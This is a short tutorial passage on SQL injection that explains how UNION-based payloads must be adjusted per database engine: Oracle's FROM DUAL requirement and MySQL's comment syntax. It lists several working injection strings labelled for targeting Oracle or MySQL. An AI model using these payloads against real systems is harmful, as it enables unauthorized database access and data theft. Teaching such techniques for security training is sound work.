This is a **critical point** that many beginners miss. Different databases have different syntax rules. A payload that works on MySQL may fail on Oracle.

## The Oracle Problem

**Normal payload (works on most databases):**
```sql
' UNION SELECT NULL --
```

**On Oracle, this fails** because Oracle requires a `FROM` clause in every `SELECT`.

**Oracle fix:**
```sql
' UNION SELECT NULL FROM DUAL --
```

`DUAL` is a special Oracle table that exists in every database.

## Database-Specific Differences

| Database | Comment syntax | Special requirement |
|----------|---------------|---------------------|
| **Oracle** | `--` | Must use `FROM DUAL` |
| **MySQL** | `-- ` (needs space) or `#` | None |
| **PostgreSQL** | `--` | None |
| **SQL Server** | `--` | None |

## MySQL Comment Warning

**Wrong (no space):**
```sql
' UNION SELECT NULL --'
```
The database may not recognize the comment.

**Correct:**
```sql
' UNION SELECT NULL -- '
```
Or use `#` (no space needed):
```sql
' UNION SELECT NULL #
```

## Practical Example

**Targeting Oracle:**
```
' UNION SELECT NULL FROM DUAL --
' UNION SELECT 'a', NULL FROM DUAL --
```

**Targeting MySQL:**
```
' UNION SELECT NULL -- 
' UNION SELECT NULL #
```

## One Sentence Summary

Always know the target database – Oracle needs `FROM DUAL` and MySQL needs a space after `--` (or use `#` instead).
